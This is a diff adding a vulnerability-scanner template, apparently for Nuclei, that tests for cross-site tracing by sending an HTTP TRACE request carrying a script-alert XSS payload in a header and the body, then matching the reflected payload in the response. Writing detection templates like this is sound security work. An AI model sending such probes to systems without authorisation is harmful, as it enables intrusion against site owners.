@@ -1,0 +1,46 @@
+id: cross-site-tracing-xss
+
+info:
+  name: Cross Site Tracing - Cross-Site Scripting
+  author: ritikchaddha
+  severity: low
+  description: |
+    Cross-site scripting vulnerability was discovered via HTTP TRACE method reflection. The TRACE method reflects the request body back in the response, which can beexploited for XSS attacks when user input is reflected without proper sanitization.
+  reference:
+    - https://medium.com/@tushar_rs_/cross-site-tracing-attack-xst-5aa519658b7a
+    - https://www.owasp.org/index.php/Cross_Site_Tracing
+  classification:
+    cwe-id: CWE-79
+  metadata:
+    max-request: 1
+  tags: xss,trace,generic
+
+http:
+  - raw:
+      - |
+        TRACE / HTTP/1.1
+        Host: {{Hostname}}
+        Header: <script>alert(document.domain)</script>
+        Content-Length: 27
+
+        <script>alert(document.domain)</script>
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: response
+        words:
+          - "Header: <script>alert(document.domain)</script>"
+          - "TRACE"
+        condition: and
+
+      - type: word
+        part: header
+        words:
+          - "text/html"
+          - "message/http"
+
+      - type: status
+        status:
+          - 200
+# digest: 4a0a00473045022100d099af50a6efd5f8f4142c7afea41a19ff5626fa9891bbfa1864594f1ef5096902200d71ec216ecbcfb667bfd49633d116ec31d7ef4a5b7679457e46c7dba827aa15:922c64590222798bb761d5b6d8e72950
